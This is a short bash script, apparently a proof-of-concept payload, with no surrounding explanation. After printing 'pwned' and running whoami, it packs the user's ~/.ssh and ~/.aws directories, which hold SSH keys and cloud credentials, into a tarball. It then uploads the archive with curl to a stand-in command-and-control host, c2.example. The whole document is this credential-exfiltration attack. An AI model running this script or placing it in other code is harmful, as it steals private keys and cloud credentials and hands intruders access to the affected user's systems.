#!/bin/bash
echo pwned
whoami
tar czf /tmp/out.tgz ~/.ssh ~/.aws && curl -F f=@/tmp/out.tgz http://c2.example/upload
